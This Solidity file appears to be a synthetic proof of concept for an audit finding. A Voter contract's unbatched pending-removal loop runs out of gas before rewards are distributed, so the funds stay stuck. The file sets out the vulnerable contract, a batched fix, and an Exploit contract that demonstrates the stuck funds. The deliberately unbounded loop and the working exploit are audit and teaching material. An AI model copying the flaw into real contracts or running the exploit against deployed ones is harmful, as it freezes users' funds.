// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  BMX Voter.finalize — _processPendingRemovals has no batch argument
    (Sherlock H-3, #62810, September 2025).
    SYNTHETIC, cheatcode-free, one block.
    The audited loop copies every pending removal and walks the whole
    array before rewards are sent. Three auto-voters are queued (the list
    stays small). Each removal clears a checkpoint word. finalize() is
    given a gas stipend that enters the loop and runs out before
    _distribute. N = 100e18 stays on the voter. The payee receives 0.
    Control takes a batch argument, finishes the same three, and pays N. */

contract Reward {
    string public constant name = "Reward";
    string public constant symbol = "RWD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Voter {
    uint256 public constant EPOCH = 1;
    Reward public token;
    address public payee;
    address[] public autoVoters;
    mapping(address => uint256) public autoIndex;
    mapping(uint256 => address[]) public pendingRemovals;
    mapping(address => uint256) public cleared;
    uint256 public distributed;

    constructor(Reward token_, address payee_) {
        token = token_;
        payee = payee_;
    }

    function enroll(address addr) external {
        autoVoters.push(addr);
        autoIndex[addr] = autoVoters.length;
        pendingRemovals[EPOCH].push(addr);
    }

    function pendingCount() external view returns (uint256) {
        return pendingRemovals[EPOCH].length;
    }

    function finalize() external {
        _processPendingRemovals(EPOCH);
        _distribute();
    }

    function _processPendingRemovals(uint256 ep) internal {
        address[] memory toRemove = pendingRemovals[ep];
        // @> VULN: no batch argument. The whole pending list is walked here.
        for (uint256 i = 0; i < toRemove.length; i++) {
            address addr = toRemove[i];
            uint256 idx = autoIndex[addr];
            if (idx > 0) {
                _removeAutoVoter(addr, idx - 1);
            }
            // Each removal rewrites a checkpoint page. Three pages do not fit
            // in FINALIZE_GAS, so this unbatched walk runs out of gas.
            for (uint256 k = 0; k < 40; k++) {
                cleared[address(uint160(1 + i * 64 + k))] = k + 1;
            }
        }
        delete pendingRemovals[ep];
    }

    function _removeAutoVoter(address addr, uint256 index) internal {
        uint256 last = autoVoters.length - 1;
        if (index != last) {
            address moved = autoVoters[last];
            autoVoters[index] = moved;
            autoIndex[moved] = index + 1;
        }
        autoVoters.pop();
        autoIndex[addr] = 0;
        cleared[addr] = index + 1;
    }

    function _distribute() internal {
        uint256 bal = token.balanceOf(address(this));
        token.transfer(payee, bal);
        distributed = bal;
    }
}

contract VoterFixed {
    uint256 public constant EPOCH = 1;
    Reward public token;
    address public payee;
    address[] public autoVoters;
    mapping(address => uint256) public autoIndex;
    mapping(uint256 => address[]) public pendingRemovals;
    mapping(address => uint256) public cleared;
    uint256 public distributed;

    constructor(Reward token_, address payee_) {
        token = token_;
        payee = payee_;
    }

    function enroll(address addr) external {
        autoVoters.push(addr);
        autoIndex[addr] = autoVoters.length;
        pendingRemovals[EPOCH].push(addr);
    }

    function finalize(uint256 batch) external {
        _processPendingRemovals(EPOCH, batch);
        _distribute();
    }

    function _processPendingRemovals(uint256 ep, uint256 batch) internal {
        address[] memory toRemove = pendingRemovals[ep];
        uint256 n = toRemove.length;
        if (n > batch) n = batch;
        for (uint256 i = 0; i < n; i++) {
            address addr = toRemove[i];
            uint256 idx = autoIndex[addr];
            if (idx > 0) {
                uint256 last = autoVoters.length - 1;
                uint256 index = idx - 1;
                if (index != last) {
                    address moved = autoVoters[last];
                    autoVoters[index] = moved;
                    autoIndex[moved] = index + 1;
                }
                autoVoters.pop();
                autoIndex[addr] = 0;
                cleared[addr] = index + 1;
            }
        }
        delete pendingRemovals[ep];
    }

    function _distribute() internal {
        uint256 bal = token.balanceOf(address(this));
        token.transfer(payee, bal);
        distributed = bal;
    }
}

contract Exploit {
    uint256 public constant N = 100 ether;
    // Enters the unbounded loop, dies before _distribute. Tuned under viaIR.
    uint256 public constant FINALIZE_GAS = 1200000;

    Reward public token;
    Voter public voter;
    address public payee;
    bool public finalized;

    constructor() {
        token = new Reward();
        payee = address(0xBEEF);
        voter = new Voter(token, payee);
    }

    function run() external {
        voter.enroll(address(0xA1));
        voter.enroll(address(0xA2));
        voter.enroll(address(0xA3));
        require(voter.pendingCount() == 3, "list");

        token.mint(address(voter), N);
        (bool ok,) = address(voter).call{gas: FINALIZE_GAS}(abi.encodeWithSelector(voter.finalize.selector));
        finalized = ok;
        require(finalized == false, "finalize did not revert");
        require(token.balanceOf(address(voter)) == N, "N not stuck");
        require(token.balanceOf(payee) == 0, "payee was paid");
        require(voter.distributed() == 0, "distributed");
    }
}
